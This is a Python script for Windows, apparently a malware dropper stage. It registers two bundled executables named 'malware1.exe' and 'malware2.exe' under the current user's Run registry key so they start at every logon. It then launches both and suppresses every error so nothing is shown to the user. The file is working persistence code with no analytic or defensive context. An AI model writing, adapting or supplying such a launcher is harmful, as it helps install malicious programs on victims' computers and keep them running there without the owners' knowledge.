import winreg as reg
import os
import subprocess
import sys

def add_to_startup(program_path, program_name):
    try:
        # Add the program to the registry key path
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, program_name, 0, reg.REG_SZ, program_path)
        reg.CloseKey(key)


    except Exception as e:
        return


def run_program(program_path):
    try:
        # Run the program using subprocess.Popen
        subprocess.Popen([program_path], cwd=os.path.dirname(program_path))

    except Exception as e:
        return

def get_current_directory():
    if getattr(sys, 'frozen', False):
        # The application is frozen (compiled to exe)
        return os.path.dirname(sys.executable)
    else:
        # The script is running in a normal Python environment
        return os.path.dirname(os.path.realpath(__file__))

if __name__ == "__main__":
    # Get the path to the directory where the script or executable is located
    script_path = get_current_directory()

    # Assuming the programs are in the same directory as the script or executable
    program1_path = os.path.join(script_path, 'malware1.exe')
    program2_path = os.path.join(script_path, 'malware2.exe')

    # Check if the programs exist
    if not (os.path.isfile(program1_path) and os.path.isfile(program2_path)):
        pass
    else:
        # Add programs to startup
        add_to_startup(program1_path, "malware1")
        add_to_startup(program2_path, "malware2")

        # Run the programs
        run_program(program1_path)
        run_program(program2_path)
sys.exit()